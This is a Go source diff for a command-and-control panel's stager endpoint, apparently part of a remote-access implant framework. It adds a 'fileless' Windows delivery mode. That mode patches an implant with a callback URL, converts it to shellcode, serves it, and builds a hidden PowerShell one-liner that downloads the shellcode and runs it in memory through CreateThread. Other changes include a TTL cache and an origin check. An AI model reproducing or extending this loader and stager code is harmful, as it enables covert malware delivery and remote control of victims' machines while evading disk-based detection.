@@ -17,9 +17,33 @@ import (
 	"github.com/google/uuid"
 	"github.com/gorilla/websocket"
 	"sync"
+	"time"
 )
 
+const stagerCacheTTL = 10 * time.Minute
+
+type stagerCacheEntry struct {
+	cfg       StagerConfig
+	expiresAt time.Time
+}
+
 var StagerCache = sync.Map{}
+
+func init() {
+	go func() {
+		t := time.NewTicker(2 * time.Minute)
+		defer t.Stop()
+		for range t.C {
+			now := time.Now()
+			StagerCache.Range(func(k, v interface{}) bool {
+				if e, ok := v.(stagerCacheEntry); ok && now.After(e.expiresAt) {
+					StagerCache.Delete(k)
+				}
+				return true
+			})
+		}
+	}()
+}
 
 type StagerConfig struct {
 	OS           string
@@ -30,10 +54,47 @@ type StagerConfig struct {
 	SleepTime    int
 	Profile      string // reverse_slim|beacon | reverse|standard | forward
 	Extra        string // For bat stager: "url64|url32"
+	// Delivery: ""|"disk" (default EXE) | "fileless" (stage2 PIC via Donut)
+	Delivery string
+	// Stage2ID when Delivery=fileless
+	Stage2ID string
+}
+
+func stagerCacheStore(id string, cfg StagerConfig) {
+	StagerCache.Store(id, stagerCacheEntry{cfg: cfg, expiresAt: time.Now().Add(stagerCacheTTL)})
+}
+
+func stagerCacheLoad(id string) (StagerConfig, bool) {
+	v, ok := StagerCache.Load(id)
+	if !ok {
+		return StagerConfig{}, false
+	}
+	e, ok := v.(stagerCacheEntry)
+	if !ok {
+		return StagerConfig{}, false
+	}
+	if time.Now().After(e.expiresAt) {
+		StagerCache.Delete(id)
+		return StagerConfig{}, false
+	}
+	return e.cfg, true
 }
 
 var upgrader_gen = websocket.Upgrader{
-	CheckOrigin: func(r *http.Request) bool { return true },
+	CheckOrigin: func(r *http.Request) bool {
+		origin := r.Header.Get("Origin")
+		if origin == "" {
+			return true
+		}
+		if strings.Contains(origin, "localhost") || strings.Contains(origin, "127.0.0.1") {
+			return true
+		}
+		host := r.Host
+		if host != "" && strings.Contains(origin, host) {
+			return true
+		}
+		return false
+	},
 }
 
 // Product client types (UI / API "profile" field) — two directions, SAME capability:
@@ -444,6 +505,15 @@ func HandleGetStager(c *gin.Context) {
 	// host = Agent 回连地址（写入 payload），绝不能当作面板下载域名
 	callbackHost := strings.TrimSpace(c.Query("host"))
 	product := normalizeCapabilityProfile(c.Query("profile"))
+	// delivery: disk (default) | fileless
+	delivery := strings.ToLower(strings.TrimSpace(c.Query("delivery")))
+	if delivery == "" {
+		delivery = "disk"
+	}
+	if delivery != "disk" && delivery != "fileless" {
+		c.JSON(400, gin.H{"error": "delivery must be disk or fileless"})
+		return
+	}
 
 	if listenerID == "" || osType == "" {
 		c.JSON(400, gin.H{"error": "listener_id and os are required"})
@@ -496,25 +566,60 @@ func HandleGetStager(c *gin.Context) {
 		return strings.ReplaceAll(uuid.New().String(), "-", "")[:8]
 	}
 
+	if osType == "windows" && delivery == "fileless" {
+		// Fileless: patch Stage0 PE → Donut PIC → cache as stage2; return fetch URL + PS loader
+		stage2ID, stage2URL, stage2Len, ferr := buildAndCacheFilelessStage2(
+			c, listenerID, callbackHost, "x64", profile, httpProto, downloadHost,
+		)
+		if ferr != nil {
+			c.JSON(500, gin.H{"error": "fileless stage2: " + ferr.Error(), "delivery": "fileless"})
+			return
+		}
+		// PowerShell lab loader: download raw stage2 PIC → AllocHGlobal → CreateThread
+		psCommand := fmt.Sprintf(
+			`powershell -nop -w hidden -c "$u='%s';$f=Join-Path $env:TEMP ('s2_'+[guid]::NewGuid().ToString('n'));iwr -UseBasicParsing $u -OutFile $f;$b=[IO.File]::ReadAllBytes($f);Remove-Item $f -Force -EA 0;$m=[Runtime.InteropServices.Marshal];$p=$m::AllocHGlobal($b.Length);$m::Copy($b,0,$p,$b.Length);$t=Add-Type -MemberDefinition '[DllImport(\"kernel32\")]public static extern IntPtr CreateThread(IntPtr a,uint b,IntPtr c,IntPtr d,uint e,IntPtr f);[DllImport(\"kernel32\")]public static extern uint WaitForSingleObject(IntPtr h,uint m);' -Name T -PassThru;$h=$t::CreateThread(0,0,$p,0,0,0);$t::WaitForSingleObject($h,0xFFFFFFFF)"`,
+			stage2URL,
+		)
+		// Stager env form (cupcake-stager uses CUPCAKE_STAGE2_URL)
+		command := fmt.Sprintf(
+			`set CUPCAKE_STAGE2_URL=%s&& cupcake-stager.exe`,
+			stage2URL,
+		)
+		c.JSON(200, gin.H{
+			"id":             stage2ID,
+			"delivery":       "fileless",
+			"command":        command,
+			"command_ps":     psCommand,
+			"download":       stage2URL,
+			"stage2_url":     stage2URL,
+			"stage2_bytes":   stage2Len,
+			"callback":       callbackHost,
+			"profile":        product,
+			"profile_label":  profileProductLabel(product) + " · fileless",
+			"panel_host":     downloadHost,
+		})
+		return
+	}
+
 	if osType == "windows" {
 		id64 := newID()
 		id32 := newID()
-		StagerCache.Store(id64, StagerConfig{
+		stagerCacheStore(id64, StagerConfig{
 			OS: "windows", Arch: "x64", ListenerID: listenerID, Host: callbackHost,
-			AutoDestruct: true, SleepTime: 0, Profile: profile,
+			AutoDestruct: true, SleepTime: 0, Profile: profile, Delivery: "disk",
 		})
-		StagerCache.Store(id32, StagerConfig{
+		stagerCacheStore(id32, StagerConfig{
 			OS: "windows", Arch: "x86", ListenerID: listenerID, Host: callbackHost,
-			AutoDestruct: true, SleepTime: 0, Profile: profile,
+			AutoDestruct: true, SleepTime: 0, Profile: profile, Delivery: "disk",
 		})
 
 		url64 := fmt.Sprintf("%s://%s/api/s/bin/%s", httpProto, downloadHost, id64)
 		url32 := fmt.Sprintf("%s://%s/api/s/bin/%s", httpProto, downloadHost, id32)
 
 		batID := fmt.Sprintf("w_%s_%s", id64, id32)
-		StagerCache.Store(batID, StagerConfig{
+		stagerCacheStore(batID, StagerConfig{
 			OS: "windows_bat", Arch: "auto", ListenerID: listenerID, Host: callbackHost,
-			AutoDestruct: true, SleepTime: 0, Profile: profile,
+			AutoDestruct: true, SleepTime: 0, Profile: profile, Delivery: "disk",
 			Extra: fmt.Sprintf("%s|%s", url64, url32),
 		})
 
@@ -532,14 +637,15 @@ func HandleGetStager(c *gin.Context) {
 		)
 
 		c.JSON(200, gin.H{
-			"id":          batID,
-			"command":     command,
-			"command_ps":  psCommand,
-			"download":    batURL,
-			"callback":    callbackHost,
-			"profile":     product,
+			"id":            batID,
+			"delivery":      "disk",
+			"command":       command,
+			"command_ps":    psCommand,
+			"download":      batURL,
+			"callback":      callbackHost,
+			"profile":       product,
 			"profile_label": profileProductLabel(product),
-			"panel_host":  downloadHost,
+			"panel_host":    downloadHost,
 		})
 		return
 	}
@@ -549,7 +655,7 @@ func HandleGetStager(c *gin.Context) {
 		arch = "x64"
 	}
 	id := newID()
-	StagerCache.Store(id, StagerConfig{
+	stagerCacheStore(id, StagerConfig{
 		OS: "linux", Arch: arch, ListenerID: listenerID, Host: callbackHost,
 		AutoDestruct: true, SleepTime: 0, Profile: profile,
 	})
@@ -580,12 +686,11 @@ func HandleGetStager(c *gin.Context) {
 
 func HandleServePayload(c *gin.Context) {
 	id := c.Param("id")
-	val, ok := StagerCache.Load(id)
+	conf, ok := stagerCacheLoad(id)
 	if !ok {
 		c.Data(404, "text/plain", []byte("Not found"))
 		return
 	}
-	conf := val.(StagerConfig)
 
 	// 🚀 Windows BAT stager: returns a script that auto-detects x64/x86
 	if conf.OS == "windows_bat" {
@@ -671,12 +776,11 @@ exit /b 0
 // Windows BAT stager at /api/s/bin/:id.
 func HandleServeRawPayload(c *gin.Context) {
 	id := c.Param("id")
-	val, ok := StagerCache.Load(id)
+	conf, ok := stagerCacheLoad(id)
 	if !ok {
 		c.Data(404, "text/plain", []byte("stager id expired or unknown — regenerate one-click command in the panel"))
 		return
 	}
-	conf := val.(StagerConfig)
 
 	// Auto-detect target OS from User-Agent if set to "auto"
 	targetOS := conf.OS
@@ -803,6 +907,106 @@ func HandleServeRawPayload(c *gin.Context) {
 	}
 	c.Header("Content-Disposition", "attachment; filename="+fname)
 	c.Data(200, "application/octet-stream", patched)
+}
+
+// buildAndCacheFilelessStage2 patches a Stage0 template (same as disk /api/s/bin) then Donut→PIC.
+func buildAndCacheFilelessStage2(
+	c *gin.Context,
+	listenerID, callbackHost, arch, profile, httpProto, downloadHost string,
+) (stage2ID, stage2URL string, nbytes int, err error) {
+	lnVal, ok := globals.Listeners.Load(listenerID)
+	if !ok {
+		return "", "", 0, fmt.Errorf("listener offline")
+	}
+	ln := lnVal.(*globals.Listener)
+
+	targetOS := "windows"
+	archHint := arch
+	templateName, _ := resolvePatchTemplate(targetOS, archHint, ln.Protocol, profile)
+	if templateName == "" {
+		templateName, _ = resolvePatchTemplate(targetOS, archHint, ln.Protocol, "minimal")
+	}
+	if templateName == "" {
+		return "", "", 0, fmt.Errorf("no template for fileless profile")
+	}
+	templatePath := filepath.Join("assets", templateName)
+	raw, rerr := os.ReadFile(templatePath)
+	if rerr != nil || len(raw) == 0 {
+		// Fallback standard
+		stdName, _ := resolvePatchTemplate(targetOS, archHint, ln.Protocol, "standard")
+		if stdName != "" {
+			raw, rerr = os.ReadFile(filepath.Join("assets", stdName))
+		}
+	}
+	if rerr != nil || len(raw) == 0 {
+		return "", "", 0, fmt.Errorf("template missing: assets/%s", templateName)
+	}
+
+	host := callbackHost
+	if host == "" {
+		host = strings.Split(downloadHost, ":")[0]
+	}
+	host = strings.TrimPrefix(host, "http://")
+	host = strings.TrimPrefix(host, "https://")
+	host = strings.Split(host, "/")[0]
+	if strings.Contains(host, ":") && !strings.Contains(host, "]") {
+		host = strings.Split(host, ":")[0]
+	}
+
+	c2url := ""
+	switch strings.ToUpper(ln.Protocol) {
+	case "WS", "WEBSOCKET":
+		c2url = fmt.Sprintf("ws://%s:%d/ws", host, ln.Port)
+	case "WSS":
+		c2url = fmt.Sprintf("wss://%s:%d/ws", host, ln.Port)
+	case "TCP":
+		c2url = fmt.Sprintf("tcp://%s:%d", host, ln.Port)
+	case "BIND-TCP", "正向TCP":
+		c2url = fmt.Sprintf("bind://0.0.0.0:%d", ln.Port)
+	case "DNS":
+		c2url = fmt.Sprintf("dns://%s", ln.NSDomain)
+	default:
+		c2url = fmt.Sprintf("ws://%s:%d/ws", host, ln.Port)
+	}
+
+	patched, perr := services.PatchPayload(
+		raw, c2url, ln.EncryptKey, ln.HeartbeatInterval, ln.HeartbeatJitter, "",
+		true, 0, ln.EncryptionSalt, ln.ObfuscateMode,
+	)
+	if perr != nil {
+		return "", "", 0, fmt.Errorf("patch: %w", perr)
+	}
+
+	sc, serr := services.BuildFilelessStage2(patched, arch)
+	if serr != nil {
+		return "", "", 0, serr
+	}
+
+	id := strings.ReplaceAll(uuid.New().String(), "-", "")[:12]
+	services.StoreStage2(id, sc, arch, listenerID, c2url)
+	stagerCacheStore(id, StagerConfig{
+		OS: "windows", Arch: arch, ListenerID: listenerID, Host: host,
+		AutoDestruct: true, Profile: profile, Delivery: "fileless", Stage2ID: id,
+	})
+	url := services.Stage2URL(httpProto, downloadHost, id)
+	return id, url, len(sc), nil
+}
+
+// HandleServeStage2 serves cached fileless PIC/shellcode (public stager route).
+func HandleServeStage2(c *gin.Context) {
+	id := c.Param("id")
+	if id == "" || strings.Contains(id, "..") || strings.Contains(id, "/") {
+		c.Data(400, "text/plain", []byte("bad id"))
+		return
+	}
+	body, _, err := services.LoadStage2(id)
+	if err != nil {
+		c.Data(404, "text/plain", []byte(err.Error()))
+		return
+	}
+	c.Header("Content-Disposition", "attachment; filename=stage2.bin")
+	c.Header("Cache-Control", "no-store")
+	c.Data(200, "application/octet-stream", body)
 }
 
 // HandleServeProtectedPayload: 受保护的 Payload 下载接口（替代 Static("/downloads")）
